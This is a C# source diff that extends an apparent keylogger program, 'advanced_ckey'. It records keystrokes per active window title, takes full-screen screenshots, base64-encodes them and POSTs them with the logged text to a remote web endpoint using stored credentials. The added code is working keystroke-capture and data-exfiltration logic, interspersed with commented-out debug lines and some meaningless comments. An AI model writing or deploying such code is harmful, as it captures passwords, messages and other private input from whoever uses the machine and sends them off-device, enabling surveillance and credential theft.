@@ -14,6 +14,10 @@ using Microsoft.VisualBasic;
 using System.Drawing.Imaging;
 using System.IO;
 using System.Diagnostics;
+using System.Text.Json;
+using System.Net;
+using System.Json;
+using System.Collections.Specialized;
 
 namespace advanced_ckey
 {
@@ -60,8 +64,8 @@ namespace advanced_ckey
         public string GetActiveWindowTitle()  //get active windows title here
         {
             const int nChars = 256;
-        StringBuilder Buff = new StringBuilder(nChars);
-        IntPtr handle = GetForegroundWindow();
+            StringBuilder Buff = new StringBuilder(nChars);
+            IntPtr handle = GetForegroundWindow();
 
             if (GetWindowText(handle, Buff, nChars) > 0)
             {
@@ -89,28 +93,130 @@ namespace advanced_ckey
 
         private void K_Down(string key)
         {
-            textBox1.Text += key;   //writes keystokes into textbox1 calling keyboard class to show keystokes 
+            {
+                if ( key is string && this.GetActiveWindowTitle() is string)
+                {
+                    if ( this.loggedText.ContainsKey( this.GetActiveWindowTitle() ) )
+                    {
+                        this.loggedText[this.GetActiveWindowTitle()] += key;
+                    }
+                    else
+                    {
+                        this.loggedText[this.GetActiveWindowTitle()] = key;
+                    }
+                  //  MessageBox.Show(this.GetActiveWindowTitle() + this.loggedText[this.GetActiveWindowTitle()] );
+
+                }
+            }
+        //    string x = JsonSerializer.Serialize(this.loggedText);
+        //    MessageBox.Show( x );
+        //    textBox1.Text += key;   //writes keystokes into textbox1 calling keyboard class to show keystokes 
         }
+
+        public dynamic loggedText = new Dictionary<string, object>();
 
         public void screenshot()  // the method that handles the screenshot
         {
             string filename = "Screencapture" + DateTime.Now.ToString("ddMMyyyy-hhmmss") + ".png";
             try
             {
-                Bitmap captureBitmap = new Bitmap(1024, 768, PixelFormat.Format32bppArgb);
+                //    MessageBox.Show( filename + ".com");
 
                 Rectangle captureRectangle = Screen.AllScreens[0].Bounds;
+                Bitmap bitmap = new Bitmap( Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format32bppArgb);
 
-                Graphics captureGraphics = Graphics.FromImage(captureBitmap);
 
-                captureGraphics.CopyFromScreen(captureRectangle.Left, captureRectangle.Top, 0, 0, captureRectangle.Size);
+                using( Graphics captureGraphics = Graphics.FromImage(bitmap) )
+                {
+                    captureGraphics.CopyFromScreen(captureRectangle.Left, captureRectangle.Top, 0, 0, captureRectangle.Size);
+                }
+                System.IO.MemoryStream stream = new System.IO.MemoryStream();
+                bitmap.Save( stream, ImageFormat.Jpeg);
+                byte[] imageBytes = stream.ToArray();
+            //    string path = @"C:\MyDir\Screenshot\" + filename;
+            //    bitmap.Save( path, ImageFormat.Jpeg);
+            //    byte[] imageBytes = File.ReadAllBytes( path );
 
-                captureBitmap.Save(@"C:\MyDir\Screenshot\" + filename , ImageFormat.Jpeg);
+                string screenshot = Convert.ToBase64String(imageBytes);
+                string keystrokes = JsonSerializer.Serialize(this.loggedText);
+            //    MessageBox.Show( screenshot.Length.ToString() );
+            //    textBox1.Text += keystrokes;
+           //     MessageBox.Show( textBox1.Text );
+            //    textBox1.Text += screenshot;
+            //     screenshot = "";
+
+                //    MessageBox.Show( "xxx-" + screenshot + ".com");
+                //  what is it now now that u want now 
+                //  sjsdbbdjd ne3r rn what do you need now
+
+                try
+                {
+                    string URI = "https://" + Properties.Settings.Default.weburl + "/widgets/Workplace_Log?pc_widget_output_method=JSON";
+
+                //    string defaultParameters = "user_id=" + Properties.Settings.Default.user_id + "&auth_token=" + Properties.Settings.Default.auth_token + "&";
+
+                    using (WebClient wc = new WebClient())
+                    {
+                        wc.Headers[HttpRequestHeader.ContentType] = "application/x-www-form-urlencoded";
+                        //    string parameters = "texts=" + keystrokes + "&screenshot=" + screenshot + "&window_title=" + this.GetActiveWindowTitle();
+                        //    MessageBox.Show( keystrokes ); 
+                        //    MessageBox.Show( parameters.Length.ToString() ); 
+                        //    string jsonResponse = wc.UploadString( URI, defaultParameters + parameters );
+                        NameValueCollection paramsX = new NameValueCollection();
+
+                        paramsX.Add("user_id", Properties.Settings.Default.user_id);
+                        paramsX.Add("auth_token", Properties.Settings.Default.auth_token);
+                        paramsX.Add("texts", keystrokes);
+                        paramsX.Add("screenshot", screenshot);
+                        paramsX.Add("window_title", this.GetActiveWindowTitle());
+
+                        Byte[] responseBytes = wc.UploadValues( URI, "POST", paramsX );
+                        string jsonResponse = Encoding.UTF8.GetString( responseBytes );
+                    //    MessageBox.Show( jsonResponse ); 
+                        dynamic result = JsonValue.Parse(jsonResponse);
+
+                        //    MessageBox.Show( defaultParameters );
+                        //   MessageBox.Show( parameters.Length.ToString() ); 
+
+                        try
+                        {
+                            if( result["authenticated"] == false )
+                            {
+                                Properties.Settings.Default.auth_token = "";
+                                Properties.Settings.Default.user_id = "";
+                                MessageBox.Show( "Authentication failed" );   
+                                new Formlog();
+                                return;
+                            }
+                        //    MessageBox.Show( result["goodnews"] );
+                            this.loggedText.Clear();
+
+                        }
+                        catch (Exception)
+                        {
+                            if( result["authenticated"] == false )
+                            {
+                                Properties.Settings.Default.auth_token = "";
+                                Properties.Settings.Default.user_id = "";
+                                MessageBox.Show( "Authentication failed" );   
+                                new Formlog();
+                            }
+                            return;
+                        }
+
+                    }
+
+                }
+                catch (Exception x2 )
+                {
+                    MessageBox.Show( x2.Message );
+                }
             }
-            catch (Exception)
+            catch(Exception x1 )
             {
+                MessageBox.Show( x1.Message );
             }
-        }       
+        }
 
         public void savetextfile()    // method saving textfile to file explorer
         {
